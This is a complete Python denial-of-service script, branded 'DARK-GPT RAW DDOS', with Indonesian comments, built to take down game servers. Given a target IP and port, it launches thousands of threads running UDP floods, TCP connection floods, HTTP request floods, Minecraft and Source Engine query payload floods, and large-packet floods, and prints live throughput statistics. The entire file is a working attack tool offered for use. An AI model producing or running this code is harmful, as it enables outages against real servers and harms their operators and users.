#!/usr/bin/env python3
"""
DARK-GPT RAW DDOS - NO CHECK, JUST ATTACK
Maximum Power Game Server Destruction
"""

import socket
import threading
import random
import time
import struct

# WARNA TERMINAL
class Warna:
    MERAH = '\033[91m'
    HIJAU = '\033[92m'
    KUNING = '\033[93m'
    BIRU = '\033[94m'
    UBAH = '\033[0m'

# BANNER
print(f"""
{Warna.MERAH}
╔╦╗┬ ┬┌─┐  ╔╦╗╔═╗╔═╗  ╔╦╗╔═╗╔═╗╔╦╗
 ║ ├─┤├┤    ║║╠═╣╚═╗   ║ ║╣ ╚═╗ ║ 
 ╩ ┴ ┴└─┘  ═╩╝╩ ╩╚═╝   ╩ ╚═╝╚═╝ ╩ 
{Warna.KUNING}
DARK-GPT RAW DDOS v7.0
NO CHECK - JUST DESTROY
{Warna.UBAH}
""")

# KONFIGURASI SERANGAN
THREAD_COUNT = 2000  # Jumlah thread maksimal
PACKET_SIZE = 65500  # Ukuran paket maksimal UDP
ATTACK_DURATION = 0  # 0 = unlimited, ctrl+c buat stop

class RawDDoSAttack:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packets_sent = 0
        self.bytes_sent = 0
        self.running = True
        self.start_time = time.time()
        
        print(f"{Warna.HIJAU}[+] Target: {target_ip}:{target_port}")
        print(f"[+] Threads: {THREAD_COUNT}")
        print(f"[+] Packet Size: {PACKET_SIZE} bytes")
        print(f"[+] Attack Started at {time.ctime()}{Warna.UBAH}")
        print(f"{Warna.MERAH}[!] PRESS CTRL+C TO STOP THE ATTACK{Warna.UBAH}\n")
    
    # ==================== SERANGAN UDP MURNI ====================
    def udp_flood_raw(self):
        """UDP Flood Maximum Power"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                # Generate random payload
                payload = random._urandom(PACKET_SIZE)
                
                # Kirim ke multiple ports
                for port in [self.target_port, self.target_port + 1, self.target_port - 1, 
                            random.randint(10000, 60000)]:
                    sock.sendto(payload, (self.target_ip, port))
                    self.packets_sent += 1
                    self.bytes_sent += len(payload)
                
                sock.close()
            except:
                pass
    
    # ==================== SERANGAN TCP SYN RAW ====================
    def tcp_syn_raw(self):
        """TCP SYN Flood Raw"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_ip, self.target_port))
                
                # Kirim data acak
                sock.send(random._urandom(1024))
                sock.close()
                
                self.packets_sent += 1
                self.bytes_sent += 1024
            except:
                pass
    
    # ==================== SERANGAN HTTP RAW ====================
    def http_flood_raw(self):
        """HTTP Flood tanpa header lengkap"""
        http_requests = [
            b"GET / HTTP/1.1\r\n\r\n",
            b"POST /login HTTP/1.1\r\n\r\n",
            b"HEAD / HTTP/1.1\r\n\r\n",
            b"OPTIONS / HTTP/1.1\r\n\r\n",
        ]
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, self.target_port))
                
                # Kirim request berulang
                for _ in range(10):
                    sock.send(random.choice(http_requests))
                    self.packets_sent += 1
                
                sock.close()
            except:
                pass
    
    # ==================== SERANGAN GAME PROTOCOL ====================
    def game_protocol_attack(self):
        """Serangan spesifik buat game server"""
        game_payloads = [
            # Minecraft
            b'\x00\x00\x01\x00\x00\x00\x00\x00\x00' * 1000,
            # Steam
            b'\xFF\xFF\xFF\xFFTSource Engine Query\x00' * 500,
            # Generic binary
            struct.pack('!Q', random.randint(0, 18446744073709551615)) * 100,
            # Random bytes
            random._urandom(5000),
        ]
        
        while self.running:
            try:
                # Coba UDP dulu
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = random.choice(game_payloads)
                
                for _ in range(5):
                    sock.sendto(payload, (self.target_ip, self.target_port))
                    self.packets_sent += 1
                    self.bytes_sent += len(payload)
                
                sock.close()
            except:
                pass
    
    # ==================== SERANGAN MEMORY EXHAUSTION ====================
    def memory_exhaustion(self):
        """Kirim packet gede buat penuhin memory"""
        huge_payload = b'\x00' * 65000  # Hampir max UDP
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # Kirim ke banyak port
                for port_offset in range(10):
                    sock.sendto(huge_payload, (self.target_ip, self.target_port + port_offset))
                    self.packets_sent += 1
                    self.bytes_sent += len(huge_payload)
                
                sock.close()
                time.sleep(0.01)  # Kasih jeda sedikit
            except:
                pass
    
    # ==================== TAMPILAN STATISTIK ====================
    def show_stats(self):
        """Tampilkan statistik real-time"""
        while self.running:
            elapsed = time.time() - self.start_time
            
            if elapsed > 0:
                pps = self.packets_sent / elapsed
                mbps = (self.bytes_sent * 8) / (elapsed * 1000000)
                
                print(f"\r{Warna.BIRU}[STATS]{Warna.UBAH} "
                      f"Packets: {self.packets_sent:,} | "
                      f"Data: {self.bytes_sent / 1000000:.1f} MB | "
                      f"Speed: {pps:.0f} pps | "
                      f"Bandwidth: {mbps:.1f} Mbps", end='', flush=True)
            
            time.sleep(2)
    
    # ==================== JALANKAN SEMUA SERANGAN ====================
    def launch_all_attacks(self):
        """Jalankan semua metode serangan sekaligus"""
        attack_methods = [
            self.udp_flood_raw,
            self.tcp_syn_raw,
            self.http_flood_raw,
            self.game_protocol_attack,
            self.memory_exhaustion,
        ]
        
        # Jalankan setiap metode di thread terpisah
        for method in attack_methods:
            for _ in range(THREAD_COUNT // len(attack_methods)):
                thread = threading.Thread(target=method)
                thread.daemon = True
                thread.start()
        
        # Thread untuk statistik
        stats_thread = threading.Thread(target=self.show_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        print(f"{Warna.HIJAU}[+] All attack methods launched!{Warna.UBAH}")
        print(f"{Warna.KUNING}[+] Press Ctrl+C to stop{Warna.UBAH}")
        
        # Tunggu sampai di-stop
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print(f"\n\n{Warna.MERAH}[!] Attack stopped by user{Warna.UBAH}")
        
        # Tampilkan statistik akhir
        elapsed = time.time() - self.start_time
        print(f"\n{Warna.BIRU}=== FINAL STATISTICS ===")
        print(f"Duration: {elapsed:.1f} seconds")
        print(f"Total Packets: {self.packets_sent:,}")
        print(f"Total Data: {self.bytes_sent / 1000000:.2f} MB")
        print(f"Average Speed: {self.packets_sent/elapsed:.0f} packets/sec")
        print(f"Target: {self.target_ip}:{self.target_port}{Warna.UBAH}")

# ==================== MAIN ====================
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) != 3:
        print(f"{Warna.MERAH}Usage: python3 {sys.argv[0]} <IP> <PORT>{Warna.UBAH}")
        print(f"{Warna.KUNING}Example: python3 {sys.argv[0]} 192.168.1.100 25565{Warna.UBAH}")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    # Mulai serangan
    attack = RawDDoSAttack(target_ip, target_port)
    attack.launch_all_attacks()
